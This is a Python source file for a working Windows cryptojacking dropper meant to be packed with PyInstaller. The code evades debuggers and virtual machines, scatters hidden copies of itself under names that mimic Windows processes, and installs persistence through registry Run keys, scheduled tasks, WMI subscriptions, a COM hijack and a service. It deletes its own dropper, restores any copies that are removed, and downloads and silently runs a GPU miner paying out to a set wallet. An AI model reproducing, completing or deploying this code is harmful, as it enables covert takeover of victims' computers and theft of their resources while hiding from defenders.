# main.py
# Language: Python 3.10+ | Runtime: Windows 10/11 x64 | Target: PyInstaller --onefile --noconsole --uac-admin (optional)
# Build:
#   pip install psutil pywin32
#   pyinstaller --onefile --noconsole --clean --uac-admin ^
#       --hidden-import=psutil --hidden-import=win32api --hidden-import=win32con ^
#       --hidden-import=win32process --hidden-import=win32event --hidden-import=win32security ^
#       --hidden-import=win32com.client --hidden-import=pythoncom ^
#       --hidden-import=winreg --hidden-import=ctypes ^
#       main.py

import os
import sys
import time
import shutil
import random
import string
import hashlib
import hmac
import threading
import subprocess
import tempfile
import atexit
import base64
import struct
import ctypes
import urllib.request
from pathlib import Path
from typing import List, Optional, Tuple, Dict

# Optional deps
try:
    import psutil
except ImportError:
    psutil = None

try:
    import win32api
    import win32con
    import win32process
    import win32event
    import win32security
    import win32com.client
    import pythoncom
except ImportError:
    win32api = win32con = win32process = win32event = win32security = None
    win32com = pythoncom = None

try:
    import winreg
except ImportError:
    winreg = None

# ========================= CONFIG =========================
WALLET              = "prl1pdrzjrntq8fva0kcxdte2y4whhxsv7nhz24pvfj7r87qltc37vuuqmxq9j0"  # replace with real prl1 address
POOL                = "prl.kryptex.network:7048"
MINER_NAME          = "RuntimeBroker.exe"          # final on-disk name of the real miner binary
# SRBMiner-MULTI current pearlhash-capable release
MINER_URL           = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-win64.zip"
MINER_SHA256        = ""                           # leave empty to skip hash check
TARGET_CPU_PCT      = 30                           # only used if GPU miner fails (GPU is primary)
INSTANCE_COUNT      = 5
HEAL_BASE_INTERVAL  = 210                          # seconds ± jitter → low noise
START_JITTER        = (1.8, 7.5)
MANIFEST_KEY_SEED   = b"SysCore_9E4B7D2A_v4"
MANIFEST_VERSION    = 4

# Large rotating system-like name pool (looks like real Windows components)
NAME_POOL = [
    "RuntimeBroker", "SearchIndexer", "WmiPrvSE", "sihost", "taskhostw",
    "ctfmon", "dllhost", "conhost", "fontdrvhost", "dwm",
    "ApplicationFrameHost", "ShellExperienceHost", "StartMenuExperienceHost",
    "SecurityHealthSystray", "SystemSettings", "UserOOBEBroker",
    "backgroundTaskHost", "smartscreen", "CompatTelRunner", "MusNotification",
    "TextInputHost", "LockApp", "SearchApp", "Video.UI", "GameBar",
    "XboxApp", "YourPhone", "PhoneExperienceHost", "Widgets", "SystemSettingsBroker",
    "NvContainer", "IntelCpHDCPSvc", "RtkAudUService64", "AMDExternalEvents",
    "AdobeARM", "GoogleUpdate", "MicrosoftEdgeUpdate", "OneDriveSetup",
    "SecurityHealthService", "SgrmBroker", "TokenBroker", "UserDataSvc",
]

# ==========================================================

def _env(key: str, default: str = "") -> str:
    return os.environ.get(key, default)

def is_frozen() -> bool:
    return getattr(sys, "frozen", False)

def get_self() -> str:
    if is_frozen():
        return sys.executable
    return os.path.abspath(sys.argv[0])

def machine_key() -> bytes:
    """Stable per-machine key material for manifest crypto."""
    raw = (
        _env("COMPUTERNAME", "PC") +
        _env("PROCESSOR_IDENTIFIER", "") +
        _env("SystemRoot", "C:\\Windows") +
        _env("USERNAME", "")
    ).encode("utf-8", errors="ignore")
    return hashlib.sha256(MANIFEST_KEY_SEED + raw).digest()

def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encrypt_blob(text: str) -> str:
    raw = text.encode("utf-8")
    key = machine_key()
    enc = xor_crypt(raw, key)
    tag = hmac.new(key, enc, hashlib.sha256).digest()[:12]
    return base64.urlsafe_b64encode(tag + enc).decode("ascii")

def decrypt_blob(blob: str) -> str:
    try:
        raw = base64.urlsafe_b64decode(blob.encode("ascii"))
        if len(raw) < 13:
            return ""
        tag, enc = raw[:12], raw[12:]
        key = machine_key()
        expected = hmac.new(key, enc, hashlib.sha256).digest()[:12]
        if not hmac.compare_digest(tag, expected):
            return ""
        return xor_crypt(enc, key).decode("utf-8")
    except Exception:
        return ""

# -------------------- Anti-analysis --------------------

def is_analysis_environment() -> bool:
    """Early exit on debugger / accelerated sandbox / common VM tools."""
    # Debugger
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        dbg = ctypes.c_int(0)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(dbg)
        )
        if dbg.value:
            return True
    except Exception:
        pass

    # Timing (sandbox time acceleration)
    t0 = time.perf_counter()
    time.sleep(0.42)
    if (time.perf_counter() - t0) < 0.32:
        return True

    # Common analysis / VM process names
    bad = {
        "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
        "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "xenservice.exe",
        "qemu-ga.exe", "prl_tools.exe", "prl_cc.exe", "wireshark.exe",
        "procmon.exe", "procmon64.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
        "idaq.exe", "idaq64.exe", "idag.exe", "idag64.exe", "windbg.exe",
        "fiddler.exe", "httpdebugger.exe", "procexp.exe",
        "procexp64.exe", "autoruns.exe", "autorunsc.exe", "tcpview.exe",
        "filemon.exe", "regmon.exe", "apimonitor.exe", "pestudio.exe",
    }
    if psutil:
        try:
            for p in psutil.process_iter(["name"]):
                n = (p.info.get("name") or "").lower()
                if n in bad:
                    return True
        except Exception:
            pass

    # Registry / services typical of hypervisors
    if winreg:
        vm_regs = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxMouse"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
        ]
        for root, path in vm_regs:
            try:
                winreg.OpenKey(root, path)
                return True
            except FileNotFoundError:
                continue
            except Exception:
                continue

    # MAC prefixes of common hypervisors
    try:
        out = subprocess.check_output(
            ["getmac", "/fo", "csv", "/nh"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, text=True, timeout=5
        )
        for line in out.splitlines():
            mac = line.split(",")[0].strip('"').upper().replace("-", ":")
            if mac.startswith(("08:00:27", "00:05:69", "00:0C:29", "00:1C:14",
                               "00:50:56", "00:1C:42", "00:16:3E", "0A:00:27")):
                return True
    except Exception:
        pass

    return False

# -------------------- Paths & Manifest --------------------

def base_locations() -> List[str]:
    local   = _env("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
    prog    = _env("PROGRAMDATA", "C:\\ProgramData")
    temp    = _env("TEMP", os.path.expanduser("~\\AppData\\Local\\Temp"))
    appdata = _env("APPDATA", os.path.expanduser("~\\AppData\\Roaming"))
    win     = _env("WINDIR", "C:\\Windows")
    return [
        os.path.join(local,   "Microsoft", "Windows", "Caches"),
        os.path.join(prog,    "Microsoft", "Windows", "SystemData"),
        os.path.join(temp,    "Windows", "Temp"),
        os.path.join(appdata, "Microsoft", "Windows", "Themes"),
        os.path.join(local,   "Microsoft", "Windows", "Explorer"),
        os.path.join(prog,    "Microsoft", "Diagnosis"),
        os.path.join(win,     "Temp"),
        os.path.join(local,   "Microsoft", "Windows", "INetCache"),
        os.path.join(prog,    "Microsoft", "Network"),
        os.path.join(appdata, "Microsoft", "Protect"),
        os.path.join(local,   "Microsoft", "Windows", "WebCache"),
        os.path.join(prog,    "Microsoft", "Crypto"),
    ]

MANIFEST_PATH = os.path.join(
    _env("PROGRAMDATA", "C:\\ProgramData"),
    "Microsoft", "Windows", "SystemData", ".syscore_m4"
)

def make_hidden_system(path: str) -> None:
    try:
        if win32api:
            attrs = win32api.GetFileAttributes(path)
            win32api.SetFileAttributes(
                path, attrs | win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
            )
        else:
            subprocess.run(
                ["attrib", "+H", "+S", path],
                capture_output=True, creationflags=0x08000000, timeout=4
            )
    except Exception:
        pass

def ensure_dir(path: str) -> None:
    try:
        os.makedirs(path, exist_ok=True)
        make_hidden_system(path)
    except Exception:
        pass

def atomic_copy(src: str, dst: str) -> bool:
    try:
        ensure_dir(os.path.dirname(dst))
        fd, tmp = tempfile.mkstemp(dir=os.path.dirname(dst), prefix=".~")
        os.close(fd)
        shutil.copy2(src, tmp)
        os.replace(tmp, dst)
        make_hidden_system(dst)
        return True
    except Exception:
        try:
            if "tmp" in locals() and os.path.exists(tmp):
                os.remove(tmp)
        except Exception:
            pass
        return False

def generate_random_paths(count: int = INSTANCE_COUNT) -> List[str]:
    bases = base_locations()
    random.shuffle(bases)
    names = random.sample(NAME_POOL, min(count, len(NAME_POOL)))
    paths = []
    for i, name in enumerate(names):
        base = bases[i % len(bases)]
        # two-level random subdir further breaks predictability
        sub1 = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
        sub2 = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        folder = os.path.join(base, sub1, sub2)
        ensure_dir(folder)
        paths.append(os.path.join(folder, f"{name}.exe"))
    return paths

def save_manifest(paths: List[str]) -> None:
    ensure_dir(os.path.dirname(MANIFEST_PATH))
    payload = f"v{MANIFEST_VERSION}\n" + "\n".join(paths)
    blob = encrypt_blob(payload)
    try:
        Path(MANIFEST_PATH).write_text(blob, encoding="utf-8")
        make_hidden_system(MANIFEST_PATH)
    except Exception:
        pass

def load_manifest() -> List[str]:
    try:
        blob = Path(MANIFEST_PATH).read_text(encoding="utf-8").strip()
        text = decrypt_blob(blob)
        if not text:
            return []
        lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
        if not lines or not lines[0].startswith("v"):
            return []
        # version check soft — accept any v*
        return lines[1:]
    except Exception:
        return []

# -------------------- Persistence (multi-layer) --------------------

def registry_run_write(name: str, exe: str, hive=None) -> None:
    if not winreg:
        return
    try:
        if hive is None:
            hive = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
        value_name = f"Microsoft{name}"
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def registry_runonce_write(name: str, exe: str) -> None:
    if not winreg:
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, f"Microsoft{name}", 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def startup_folder_write(name: str, exe: str) -> None:
    try:
        startup = os.path.join(
            _env("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        ensure_dir(startup)
        lnk = os.path.join(startup, f"{name}.lnk")
        ps = f'''
$ws = New-Object -ComObject WScript.Shell
$s  = $ws.CreateShortcut("{lnk}")
$s.TargetPath = "{exe}"
$s.WindowStyle = 7
$s.Save()
'''
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
            capture_output=True, creationflags=0x08000000, timeout=10
        )
        make_hidden_system(lnk)
    except Exception:
        pass

def scheduled_task_write(name: str, exe: str) -> None:
    try:
        task_name = f"Microsoft\\Windows\\{name}"
        cmd = [
            "schtasks", "/Create", "/TN", task_name,
            "/TR", f'"{exe}"',
            "/SC", "ONLOGON",
            "/RL", "LIMITED",
            "/F"
        ]
        subprocess.run(cmd, capture_output=True, creationflags=0x08000000, timeout=12)
        # secondary ONSTART (fails silently without elevation)
        cmd2 = [
            "schtasks", "/Create", "/TN", f"{task_name}_boot",
            "/TR", f'"{exe}"',
            "/SC", "ONSTART",
            "/RL", "LIMITED",
            "/F"
        ]
        subprocess.run(cmd2, capture_output=True, creationflags=0x08000000, timeout=12)
    except Exception:
        pass

def wmi_persistence(name: str, exe: str) -> None:
    """WMI event subscription that fires on logon session creation."""
    try:
        if not win32com:
            return
        pythoncom.CoInitialize()
        locator = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        svc = locator.ConnectServer(".", "root\\subscription")

        filter_name = f"Microsoft{name}Filter"
        filter_query = (
            "SELECT * FROM __InstanceCreationEvent WITHIN 60 "
            "WHERE TargetInstance ISA 'Win32_LogonSession'"
        )
        f = svc.Get("__EventFilter").SpawnInstance_()
        f.Name = filter_name
        f.Query = filter_query
        f.QueryLanguage = "WQL"
        f.EventNamespace = "root\\cimv2"
        f_path = f.Put_()

        consumer_name = f"Microsoft{name}Consumer"
        c = svc.Get("CommandLineEventConsumer").SpawnInstance_()
        c.Name = consumer_name
        c.CommandLineTemplate = f'"{exe}"'
        c_path = c.Put_()

        b = svc.Get("__FilterToConsumerBinding").SpawnInstance_()
        b.Filter = f_path
        b.Consumer = c_path
        b.Put_()
    except Exception:
        pass
    finally:
        try:
            pythoncom.CoUninitialize()
        except Exception:
            pass

def com_hijack_best_effort(name: str, exe: str) -> None:
    """Best-effort CLSID hijack under current user (no elevation needed)."""
    if not winreg:
        return
    try:
        # Use a rarely-checked but legitimate-looking CLSID path under HKCU
        clsid = "{A7A63E5C-3877-4840-8727-C1EA9D7A4D50}"  # fictional but plausible
        key_path = rf"Software\Classes\CLSID\{clsid}\LocalServer32"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def try_service_install(name: str, exe: str) -> None:
    """Best-effort service only when already elevated."""
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return
        svc_name = f"SysCore{name[:8]}"
        cmd = (
            f'sc create {svc_name} binPath= "\\"{exe}\\"" '
            f'start= auto DisplayName= "Windows System Core Service"'
        )
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000, timeout=10)
        subprocess.run(
            f"sc start {svc_name}", shell=True, capture_output=True,
            creationflags=0x08000000, timeout=10
        )
    except Exception:
        pass

def install_persistence(exe_path: str) -> None:
    name = Path(exe_path).stem
    registry_run_write(name, exe_path)
    registry_runonce_write(name, exe_path)
    startup_folder_write(name, exe_path)
    scheduled_task_write(name, exe_path)
    wmi_persistence(name, exe_path)
    com_hijack_best_effort(name, exe_path)
    try_service_install(name, exe_path)

# -------------------- Scatter (first run) --------------------

def scatter() -> None:
    self = get_self()
    targets = generate_random_paths(INSTANCE_COUNT)
    for dest in targets:
        if atomic_copy(self, dest):
            install_persistence(dest)
    save_manifest(targets)

    # schedule original dropper self-delete
    try:
        if is_frozen() and os.path.abspath(self) not in [os.path.abspath(t) for t in targets]:
            bat = os.path.join(tempfile.gettempdir(), f"~{random.randint(10000, 99999)}.bat")
            with open(bat, "w", encoding="utf-8") as f:
                f.write(
                    f'@echo off\n'
                    f'timeout /t 3 /nobreak >nul\n'
                    f'del /f /q "{self}"\n'
                    f'del /f /q "%~f0"\n'
                )
            subprocess.Popen(
                ["cmd", "/c", bat],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except Exception:
        pass
    os._exit(0)

# -------------------- Heal --------------------

def heal() -> List[str]:
    """Restore any missing copies, re-register only the new ones, keep exactly INSTANCE_COUNT."""
    self = get_self()
    current = load_manifest()
    if not current:
        current = generate_random_paths(INSTANCE_COUNT)
        for dest in current:
            atomic_copy(self, dest)
            install_persistence(dest)
        save_manifest(current)
        return current

    live = []
    changed = False
    for p in current:
        if os.path.isfile(p) and os.path.getsize(p) > 2048:
            live.append(p)
        else:
            # recreate in a fresh random location (do not reuse burned path)
            new_paths = generate_random_paths(1)
            new_p = new_paths[0]
            if atomic_copy(self, new_p):
                install_persistence(new_p)
                live.append(new_p)
                changed = True
            else:
                if atomic_copy(self, p):
                    install_persistence(p)
                    live.append(p)
                    changed = True

    while len(live) < INSTANCE_COUNT:
        new_paths = generate_random_paths(1)
        new_p = new_paths[0]
        if atomic_copy(self, new_p):
            install_persistence(new_p)
            live.append(new_p)
            changed = True
        else:
            break

    if changed or len(live) != len(current):
        save_manifest(live)
    return live

# -------------------- Leader election --------------------

LOCK_FILE = os.path.join(
    _env("PROGRAMDATA", "C:\\ProgramData"),
    "Microsoft", "Windows", "SystemData", ".syslock_v4"
)
MUTEX_NAME = "Global\\SysCoreMutex_v4_9E4B7D2A"

def pid_alive(pid: int) -> bool:
    if pid <= 0:
        return False
    if psutil:
        return psutil.pid_exists(pid)
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False

def try_acquire_lock() -> bool:
    my_pid = os.getpid()
    ensure_dir(os.path.dirname(LOCK_FILE))

    mutex = None
    if win32event:
        try:
            mutex = win32event.CreateMutex(None, False, MUTEX_NAME)
            rc = win32event.WaitForSingleObject(mutex, 120)
            if rc not in (win32event.WAIT_OBJECT_0, getattr(win32con, "WAIT_ABANDONED", 0x80)):
                return False
        except Exception:
            mutex = None

    for _ in range(20):
        try:
            fd = os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_RDWR)
            os.write(fd, f"{my_pid}\n{time.time()}\n".encode())
            os.close(fd)
            make_hidden_system(LOCK_FILE)
            if mutex:
                atexit.register(lambda: win32event.ReleaseMutex(mutex) if mutex else None)
            return True
        except FileExistsError:
            try:
                with open(LOCK_FILE, "r", encoding="utf-8") as f:
                    lines = f.read().strip().splitlines()
                old = int(lines[0]) if lines and lines[0].isdigit() else -1
            except Exception:
                old = -1
            if old > 0 and pid_alive(old) and old != my_pid:
                if mutex:
                    try:
                        win32event.ReleaseMutex(mutex)
                    except Exception:
                        pass
                return False
            try:
                os.remove(LOCK_FILE)
            except Exception:
                pass
            time.sleep(0.04 + random.random() * 0.18)
        except Exception:
            time.sleep(0.07)
    return False

# -------------------- Hardware + Mining --------------------

def gather_hw() -> dict:
    info = {
        "cores": os.cpu_count() or 4,
        "ram_gb": 0.0,
        "gpu": "unknown",
        "storage_gb": 0.0,
    }
    if psutil:
        try:
            info["ram_gb"] = round(psutil.virtual_memory().total / (1024 ** 3), 1)
            total = 0
            for part in psutil.disk_partitions(all=False):
                if "fixed" in part.opts.lower() or part.fstype:
                    try:
                        total += psutil.disk_usage(part.mountpoint).total
                    except Exception:
                        pass
            info["storage_gb"] = round(total / (1024 ** 3), 1)
        except Exception:
            pass

    # modern GPU probe via CIM
    try:
        ps = "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", ps],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, text=True, timeout=10
        )
        for line in out.splitlines():
            line = line.strip()
            if line and "Microsoft" not in line:
                info["gpu"] = line[:120]
                break
    except Exception:
        pass
    return info

def pure_cpu_load(cores: int, target_pct: float = 0.30):
    stop = threading.Event()
    n_threads = max(1, int(cores * target_pct))

    def worker():
        data = os.urandom(512)
        while not stop.is_set():
            for _ in range(8000):
                data = hashlib.sha256(data).digest()
            if random.random() > 0.94:
                time.sleep(0.0005)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    try:
        while True:
            time.sleep(90)
    except Exception:
        stop.set()

def download_and_extract_miner(dest_dir: str) -> Optional[str]:
    """Download SRBMiner zip, extract SRBMiner-MULTI.exe, rename, return path or None."""
    try:
        ensure_dir(dest_dir)
        zip_path = os.path.join(dest_dir, "m.zip")
        urllib.request.urlretrieve(MINER_URL, zip_path)

        if MINER_SHA256:
            h = hashlib.sha256()
            with open(zip_path, "rb") as f:
                for chunk in iter(lambda: f.read(1 << 16), b""):
                    h.update(chunk)
            if h.hexdigest().lower() != MINER_SHA256.lower():
                os.remove(zip_path)
                return None

        import zipfile
        with zipfile.ZipFile(zip_path, "r") as z:
            for name in z.namelist():
                if name.lower().endswith("srbminer-multi.exe"):
                    target = os.path.join(dest_dir, MINER_NAME)
                    with z.open(name) as src, open(target, "wb") as dst:
                        shutil.copyfileobj(src, dst)
                    make_hidden_system(target)
                    try:
                        os.remove(zip_path)
                    except Exception:
                        pass
                    return target
        return None
    except Exception:
        return None

def launch_real_miner(hw: dict) -> bool:
    candidates = [
        os.path.join(os.path.dirname(get_self()), MINER_NAME),
        os.path.join(os.path.dirname(LOCK_FILE), MINER_NAME),
        os.path.join(_env("PROGRAMDATA"), "Microsoft", "Windows", "SystemData", MINER_NAME),
    ]
    miner = next((p for p in candidates if os.path.isfile(p) and os.path.getsize(p) > 100_000), None)

    if not miner:
        dest = os.path.join(_env("PROGRAMDATA"), "Microsoft", "Windows", "SystemData")
        miner = download_and_extract_miner(dest)

    if not miner:
        return False

    # GPU-primary PearlHash; CPU disabled. SRBMiner auto-detects GPUs.
    cmd = [
        miner,
        "--disable-cpu",
        "--algorithm", "pearlhash",
        "--pool", POOL,
        "--wallet", WALLET,
        "--password", "x",
        "--api-enable", "0",
        "--log-file", "NUL",
    ]
    try:
        CREATE_NO_WINDOW = 0x08000000
        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        flags = CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
        subprocess.Popen(
            cmd,
            creationflags=flags,
            cwd=os.path.dirname(miner),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True
        )
        return True
    except Exception:
        return False

def start_mining(hw: dict) -> None:
    if not launch_real_miner(hw):
        pure_cpu_load(hw["cores"], TARGET_CPU_PCT / 100.0)

# -------------------- Leader loop --------------------

def leader_loop():
    hw = gather_hw()
    miner_thread = threading.Thread(target=start_mining, args=(hw,), daemon=True)
    miner_thread.start()

    while True:
        try:
            heal()
        except Exception:
            pass
        sleep_for = HEAL_BASE_INTERVAL + random.uniform(-50, 110)
        time.sleep(max(75, sleep_for))

# -------------------- Entry --------------------

def main():
    if is_frozen():
        try:
            ctypes.windll.kernel32.FreeConsole()
        except Exception:
            pass

    if is_analysis_environment():
        time.sleep(random.uniform(2.5, 6.0))
        os._exit(0)

    time.sleep(random.uniform(*START_JITTER))

    if not load_manifest():
        scatter()
        return

    heal()

    if not try_acquire_lock():
        os._exit(0)

    leader_loop()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        os._exit(1)